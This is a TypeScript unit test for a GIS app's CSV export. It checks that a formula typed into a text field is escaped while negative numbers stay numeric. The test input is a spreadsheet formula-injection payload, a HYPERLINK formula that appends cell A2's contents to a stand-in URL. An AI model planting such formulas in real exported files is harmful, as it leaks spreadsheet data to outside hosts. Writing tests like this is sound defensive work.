// SPDX-License-Identifier: AGPL-3.0-or-later
import type { FeatureField, FeatureRecord } from '@gratis-gis/shared-types';
import { featuresToCsv } from './csv-export.js';

const fields = [
  { name: 'note', label: 'Note', type: 'string' },
  { name: 'depth', label: 'Depth', type: 'number' },
] as unknown as FeatureField[];

function feature(props: Record<string, unknown>): FeatureRecord {
  return {
    properties: props,
    geometry: { type: 'Point', coordinates: [-117.5, 34.1] },
  } as unknown as FeatureRecord;
}

describe('layer CSV export', () => {
  it('neutralizes a formula typed into a text field', () => {
    const csv = featuresToCsv(
      [feature({ note: '=HYPERLINK("https://x/?"&A2,"Open")', depth: -5 })],
      fields,
    );
    const row = csv.split('\r\n')[1]!;
    expect(row.startsWith(`"'=HYPERLINK(`)).toBe(true);
    // Numbers, including negative coordinates, stay numeric.
    expect(row).toContain(',-5,');
    expect(row).toContain('-117.5');
    expect(row).not.toContain("'-117.5");
  });
});
